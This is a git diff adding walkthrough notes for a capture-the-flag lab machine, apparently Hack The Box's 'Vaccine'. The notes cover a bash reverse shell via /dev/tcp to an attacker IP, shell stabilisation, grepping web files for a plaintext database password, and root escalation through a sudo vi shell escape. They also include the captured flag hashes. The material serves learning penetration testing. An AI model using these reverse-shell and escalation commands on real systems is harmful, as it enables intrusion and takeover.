@@ -369,9 +369,105 @@ os-shell> whoami
 [14:21:14] [INFO] retrieved: 'postgres'
 ```
 
-Find SUID programs.
+Use this (crappy) access to get a Bash reverse shell on your attack machine: 
+1. Set up a listener on your attack machine: `nc -lvnp 1234`
+2. Send a bash shell to your attack machine from the target:
+```
+bash -c "bash -i >& /dev/tcp/[attack ip]/1234 0>&1"
+# mine:
+bash -c "bash -i >& /dev/tcp/10.10.14.7/1234 0>&1"
+```
 
+Make the shell fully interactive (this sucked; I ended up just using the shell from above): 
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+export TERM=xterm
+```
 
-** sqlmap is still needing to be transferred over from OneNote to this repo **
-** --os-shell option passed to sqlmap will give you command execution via sql injection**
-https://www.infosecinstitute.com/resources/penetration-testing/important-sqlmap-commands/
+From the walkthrough...
+
+He wanted to `sudo -l` but didn't have a password. So...
+- Since you have PHP and SQL, he said you should find passwords in plain text in `/var/www/html`
+- So I `cd` into that directory and `grep` for the word "password" in all the files.
+- Result:
+```
+./dashboard.php:41:       $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+```
+
+If your shell dies on you, use the above username and password to ssh into the target.
+
+Now you can do your `sudo -l` with the postres password. Results: 
+```
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+You can run vi in sudo to edit that .conf file. So... 
+- You can abuse this privilege: https://gtfobins.github.io/gtfobins/vi/#sudo
+- That says: If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+```
+sudo vi -c ':!/bin/sh' /dev/null
+```
+
+Doesn't work. Alternative method (same site):
+```
+vi
+:set shell=/bin/sh
+:shell
+```
+
+So use vi to open the file you're allowed to open, and run the `set` and `shell` commands.
+```
+sudo vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+That gives you a root shell.
+- `cd` into the /root dor and find the root.txt. Flag.
+```
+# cd /root
+# ls -la
+total 52
+drwx------  7 root root 4096 Jun 22 18:55 .
+drwxr-xr-x 20 root root 4096 Oct 11  2021 ..
+lrwxrwxrwx  1 root root    9 Feb  4  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Aug 27  2019 .bashrc
+drwx------  2 root root 4096 Jul 23  2021 .cache
+drwx------  3 root root 4096 Jul 23  2021 .gnupg
+drwxr-xr-x  3 root root 4096 Jul 23  2021 .local
+-rw-r-----  1 root root 4659 Feb  4  2020 pg_hba.conf
+-rw-r--r--  1 root root  148 Aug 27  2019 .profile
+-rw-------  1 root root   33 Feb 25  2020 root.txt
+drwxr-xr-x  3 root root 4096 Jul 23  2021 snap
+drwx------  2 root root 4096 Jul 23  2021 .ssh
+-rw-------  1 root root  828 Jun 22 18:55 .viminfo
+# cat root.txt
+dd6e058e814260bc70e9bbdef2715849
+```
+
+The user shell was in the postgres user dir: 
+```
+# pwd
+/var/lib/postgresql/11
+# cd ..
+l# s -la
+total 36
+drwxr-xr-x  7 postgres postgres 4096 Jun 22 18:55 .
+drwxr-xr-x 39 root     root     4096 Jul 23  2021 ..
+drwxr-xr-x  3 postgres postgres 4096 Jul 23  2021 11
+lrwxrwxrwx  1 root     root        9 Feb  4  2020 .bash_history -> /dev/null
+drwx------  2 postgres postgres 4096 Jun 22 18:46 .cache
+drwx------  3 postgres postgres 4096 Jun 22 18:46 .gnupg
+drwxrwxr-x  3 postgres postgres 4096 Jul 23  2021 .local
+lrwxrwxrwx  1 root     root        9 Feb  4  2020 .psql_history -> /dev/null
+drwx------  2 postgres postgres 4096 Jul 23  2021 .ssh
+-r--------  1 postgres postgres   33 Oct 11  2021 user.txt
+-rw-------  1 postgres postgres  916 Jun 22 18:55 .viminfo
+# cat user.txt
+ec9b13ca4d6229cd5cc1e09980965bf7
+```
+
+![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/11b13fd4-7a98-4e4a-bde7-e7e3f4c5488e)
+
